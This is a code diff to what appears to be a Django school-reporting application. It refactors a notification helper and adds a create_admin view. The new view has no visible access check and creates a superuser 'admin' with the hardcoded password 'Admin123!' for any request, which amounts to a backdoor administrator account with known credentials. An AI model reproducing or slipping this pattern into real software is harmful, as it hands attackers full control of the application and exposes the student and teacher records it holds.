@@ -2456,13 +2456,20 @@ def counselor_violation_analytics(request):
 def create_notification(user, title, message, notification_type='general', related_report=None):
     """Helper function to create a notification"""
     try:
-        notification = Notification.objects.create(
-            user=user,
-            title=title,
-            message=message,
-            type=notification_type,
-            related_report=related_report
-        )
+        kwargs = {
+            'user': user,
+            'title': title,
+            'message': message,
+            'type': notification_type,
+        }
+        # Link to the correct report type
+        if related_report is not None:
+            from .models import StudentReport, TeacherReport
+            if isinstance(related_report, StudentReport):
+                kwargs['related_student_report'] = related_report
+            elif isinstance(related_report, TeacherReport):
+                kwargs['related_teacher_report'] = related_report
+        notification = Notification.objects.create(**kwargs)
         logger.info(f"✅ Notification created for {user.username}: {title}")
         return notification
     except Exception as e:
@@ -4976,3 +4983,15 @@ def search_students(request):
             'success': False,
             'error': str(e)
         }, status=500)
+
+def create_admin(request):
+    if User.objects.filter(username="admin").exists():
+        return HttpResponse("Admin already exists.")
+
+    User.objects.create_superuser(
+        username="admin",
+        email="admin@example.com",
+        password="Admin123!"
+    )
+
+    return HttpResponse("Superuser created successfully!")
